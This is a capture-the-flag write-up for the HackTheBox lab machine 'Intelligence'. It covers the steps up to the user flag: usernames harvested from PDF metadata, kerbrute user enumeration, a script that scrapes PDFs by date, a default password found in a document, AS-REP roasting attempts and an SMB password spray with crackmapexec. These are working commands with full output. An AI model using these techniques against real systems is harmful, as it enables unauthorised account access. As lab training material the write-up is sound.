# # `Enumeration` -

![[Pasted image 20210707124743.png]]

### Found two downloadable links-

![[Pasted image 20210707124855.png]]

They looked like just dummy pdf files -

![[Pasted image 20210707125214.png]]

### Downloading the pdf -

```bash
root@napster:~/Documents/HTB/Intelligence# wget http://10.10.10.248/documents/2020-01-01-upload.pdf
--2021-07-07 12:50:05--  http://10.10.10.248/documents/2020-01-01-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 (26K) [application/pdf]
Saving to: ‘2020-01-01-upload.pdf’

2020-01-01-upload.pdf                   100%[=============================================================================>]  26.21K   146KB/s    in 0.2s    

2021-07-07 12:50:05 (146 KB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]
root@napster:~/Documents/HTB/Intelligence# wget http://10.10.10.248/documents/2020-12-15-upload.pdf
--2021-07-07 12:50:24--  http://10.10.10.248/documents/2020-12-15-upload.pdf
Connecting to 10.10.10.248:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27242 (27K) [application/pdf]
Saving to: ‘2020-12-15-upload.pdf’

2020-12-15-upload.pdf                   100%[=============================================================================>]  26.60K   152KB/s    in 0.2s    

2021-07-07 12:50:25 (152 KB/s) - ‘2020-12-15-upload.pdf’ saved [27242/27242]
```

### Using exiftool

Just simply using exiftool on those pdf's we were able to get some names-

```bash
root@napster:~/Documents/HTB/Intelligence# exiftool 2020-01-01-upload.pdf 
ExifTool Version Number         : 12.06
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2021:07:07 12:54:59-04:00
File Inode Change Date/Time     : 2021:07:07 12:50:05-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
root@napster:~/Documents/HTB/Intelligence# exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 12.06
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 13:00:00-04:00
File Access Date/Time           : 2021:07:07 12:50:25-04:00
File Inode Change Date/Time     : 2021:07:07 12:50:25-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

we got `William.Lee` and `Jose.Williams` as usernames.

### Creating a wordlist using above names  -

```bash
Administrator
Guest
William
Jose.Williams 
William.Lee
Jwilliams
JWilliams
WLee
Wlee
LWilliams
Lwilliams
WJose
Wjose
wJose
wjose
lWilliams
lwilliams
wlee
wLee
jWilliams
jwilliams
```

### Using `kerbrute` to Brute force usernames and check if they valid -

```bash
root@napster:~/Documents/HTB/Intelligence# /root/Documents/HTB/Intelligence/kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb usernames -o users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/07/21 - Ronnie Flathers @ropnop

2021/07/07 13:50:26 >  Using KDC(s):
2021/07/07 13:50:26 >   10.10.10.248:88

2021/07/07 13:50:27 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/07/07 13:50:27 >  [+] VALID USERNAME:       Administrator@intelligence.htb
2021/07/07 13:50:27 >  Done! Tested 21 usernames (2 valid) in 0.627 seconds
```

### Checking if we have more pdf's -

Keeping in mind the format of pdf file i.e,  `2020-01-01-upload.pdf` and the last pdf file which is dated `2020-12-15-upload.pdf` we gonna check if any more pdf's are available on the site. 
We created a script- 

check_pdf.py -

```python
#!/usr/bin/python3

import requests
import os

url = 'http://intelligence.htb/documents/'

for i in range(2020,2021):
    for j in range(1,13):
        for k in range(1,31):
            date = f'{i}-{j:02}-{k:02}-upload.pdf'
            r = requests.get(url+date)
            #print (r.text)
            if (r.status_code == 200):
                print (date)
                #text = r.text
                os.system('mkdir pdf')
                os.system(f'wget {url}{date} -O pdf/{date}')
```

```bash
root@napster:~/Documents/HTB/Intelligence# python3 check_pdf.py
2020-01-01-upload.pdf
--2021-07-08 03:24:20--  http://intelligence.htb/documents/2020-01-01-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.10.10.248
Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 (26K) [application/pdf]
Saving to: ‘pdf/2020-01-01-upload.pdf’

pdf/2020-01-01-upload.pdf               100%[=============================================================================>]  26.21K   150KB/s    in 0.2s    

2021-07-08 03:24:20 (150 KB/s) - ‘pdf/2020-01-01-upload.pdf’ saved [26835/26835]

2020-01-02-upload.pdf
mkdir: cannot create directory ‘pdf’: File exists
--2021-07-08 03:24:21--  http://intelligence.htb/documents/2020-01-02-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.10.10.248
Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27002 (26K) [application/pdf]
Saving to: ‘pdf/2020-01-02-upload.pdf’

pdf/2020-01-02-upload.pdf               100%[=============================================================================>]  26.37K   153KB/s    in 0.2s    

2021-07-08 03:24:21 (153 KB/s) - ‘pdf/2020-01-02-upload.pdf’ saved [27002/27002]
<SNIP>
root@napster:~/Documents/HTB/Intelligence/pdf# ls | wc -l
84
```

Got total of 84 pdf file.

### Extracting names from the pdf's -

```bash
root@napster:~/Documents/HTB/Intelligence/pdf# exiftool * | grep Creator                                                                                      
Creator                         : William.Lee                                                                                                                 
Creator                         : Scott.Scott                                                                                                                 
Creator                         : Jason.Wright                                                                                                                
Creator                         : Veronica.Patel                                                                                                              
Creator                         : Jennifer.Thomas                                                                                                             
Creator                         : Danny.Matthews                                                                                                              
Creator                         : David.Reed                                                                                                                  
Creator                         : Stephanie.Young                                                                                                             
Creator                         : Daniel.Shelton                                                                                                              
Creator                         : Jose.Williams                                                                                                               
Creator                         : John.Coleman                                                                                                                
Creator                         : Jason.Wright                                                                                                                
Creator                         : Jose.Williams                                                                                                               
Creator                         : Daniel.Shelton                                                                                                              
Creator                         : Brian.Morris                                                                                                                
Creator                         : Jennifer.Thomas                                                                                                             
Creator                         : Thomas.Valenzuela                                                                                                           
Creator                         : Travis.Evans
<SNIP>
```

Cool now time for some awk magic -

```bash
root@napster:~/Documents/HTB/Intelligence/pdf# cat  big_userlist | awk -F ':' '{print $2}'                                                                    
 William.Lee                                                                                                                                                  
 Scott.Scott                                                                                                                                                  
 Jason.Wright                                                                                                                                                 
 Veronica.Patel                                                                                                                                               
 Jennifer.Thomas                                                                                                                                              
 Danny.Matthews                                                                                                                                               
 David.Reed                                                                                                                                                   
 Stephanie.Young                                                                                                                                              
 Daniel.Shelton                                                                                                                                               
 Jose.Williams                                                                                                                                                
 John.Coleman                                                                                                                                                 
 Jason.Wright                                                                                                                                                 
 Jose.Williams                                                                                                                                                
 Daniel.Shelton
 <SNIP>
```

Saving the output -

```bash
root@napster:~/Documents/HTB/Intelligence/pdf# cat  big_userlist | awk -F ':' '{print $2}' >> final_userlist
```

### Using `GetNPUsers` to check if someone has PreAuth disabled -

```bash
root@napster:~/Documents/HTB/Intelligence/pdf# GetNPUsers.py -no-pass -dc-ip 10.10.10.248 intelligence.htb/ -usersfile final_userlist -outputfile AS-REP_Roast
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation                                                                        
                                                                                                                                                              
[-] User William.Lee doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                 
[-] User Scott.Scott doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                 
[-] User Jason.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                
[-] User Veronica.Patel doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                              
[-] User Jennifer.Thomas doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                             
[-] User Danny.Matthews doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                              
[-] User David.Reed doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                                  
[-] User Stephanie.Young doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                             
[-] User Daniel.Shelton doesn't have UF_DONT_REQUIRE_PREAUTH set                                                                                              
[-] User Jose.Williams doesn't have UF_DONT_REQUIRE_PREAUTH set
<SNIP>
```

Nope

### Linux Ninja xD -

Converting pdf's to .txt to see if we can find anything -

Using pdftotext to do that for us -

```bash
root@napster:~/Documents/HTB/Intelligence/ape/pdf# for file in *.pdf; do pdftotext -layout "$file"; done
root@napster:~/Documents/HTB/Intelligence/ape/pdf# ls
2020-01-01-upload.pdf  2020-03-04-upload.pdf  2020-05-17-upload.pdf  2020-06-22-upload.pdf  2020-08-20-upload.pdf  2020-11-01-upload.pdf
2020-01-01-upload.txt  2020-03-04-upload.txt  2020-05-17-upload.txt  2020-06-22-upload.txt  2020-08-20-upload.txt  2020-11-01-upload.txt
2020-01-02-upload.pdf  2020-03-05-upload.pdf  2020-05-20-upload.pdf  2020-06-25-upload.pdf  2020-09-02-upload.pdf  2020-11-03-upload.pdf
2020-01-02-upload.txt  2020-03-05-upload.txt  2020-05-20-upload.txt  2020-06-25-upload.txt  2020-09-02-upload.txt  2020-11-03-upload.txt
2020-01-04-upload.pdf  2020-03-12-upload.pdf  2020-05-21-upload.pdf  2020-06-26-upload.pdf  2020-09-04-upload.pdf  2020-11-06-upload.pdf
2020-01-04-upload.txt  2020-03-12-upload.txt  2020-05-21-upload.txt  2020-06-26-upload.txt  2020-09-04-upload.txt  2020-11-06-upload.txt
2020-01-10-upload.pdf  2020-03-13-upload.pdf  2020-05-24-upload.pdf  2020-06-28-upload.pdf  2020-09-05-upload.pdf  2020-11-10-upload.pdf
2020-01-10-upload.txt  2020-03-13-upload.txt  2020-05-24-upload.txt  2020-06-28-upload.txt  2020-09-05-upload.txt  2020-11-10-upload.txt
```

Trying to grab any password -

```bash
root@napster:~/Documents/HTB/Intelligence/ape/pdf# cat *txt | grep pass*
Please login using your username and the default password of:
After logging in please change your password as soon as possible.
```

We cant see the password lets try to print the next line -

```bash
root@napster:~/Documents/HTB/Intelligence/ape/pdf# cat *txt | grep pass* -A 1
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
--
After logging in please change your password as soon as possible.

Dolor quisquam aliquam amet numquam modi.
```

We got  password


|User|Password|
|---|----|
||NewIntelligenceCorpUser9876|

### Using CrackMapExec to bruteforce -

```bash
root@napster:~/Documents/HTB/Intelligence# crackmapexec smb 10.10.10.248 -u final_userlist -p NewIntelligenceCorpUser9876                                     
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)         
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE                         
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE                         
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE                        
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE                      
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE                     
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE                      
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE                          
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE                     
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE                      
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
<SNIP>
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

We got `Tiffany.Molina` as a valid username with the password.

## `Smbmap` -

```bash
root@napster:~/Documents/HTB/Intelligence# smbmap -H 10.10.10.248 -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876'
[+] IP: 10.10.10.248:445        Name: intelligence.htb                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

### Checking Users via Smbclient -

```bash
root@napster:~/Documents/HTB/Intelligence# smbclient \\\\10.10.10.248\\Users -U Tiffany.Molina                                                                
Enter WORKGROUP\Tiffany.Molina's password:                                                                                                                    
Try "help" to get a list of possible commands.                                                                                                                
smb: \> ls                                                                                                                                                    
  .                                  DR        0  Sun Apr 18 21:20:26 2021                                                                                    
  ..                                 DR        0  Sun Apr 18 21:20:26 2021                                                                                    
  Administrator                       D        0  Sun Apr 18 20:18:39 2021                                                                                    
  All Users                       DHSrn        0  Sat Sep 15 03:21:46 2018                                                                                    
  Default                           DHR        0  Sun Apr 18 22:17:40 2021                                                                                    
  Default User                    DHSrn        0  Sat Sep 15 03:21:46 2018                                                                                    
  desktop.ini                       AHS      174  Sat Sep 15 03:11:27 2018                                                                                    
  Public                             DR        0  Sun Apr 18 20:18:39 2021                                                                                    
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021                                                                                    
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021
```

# User.txt -

On further checking upon our Tiffany.Molina directory -

```bash
smb: \Tiffany.Molina\> cd Desktop\
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Thu Jul  8 12:39:32 2021

                3770367 blocks of size 4096. 1462036 blocks available
smb: \Tiffany.Molina\Desktop\> get user.txt 
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

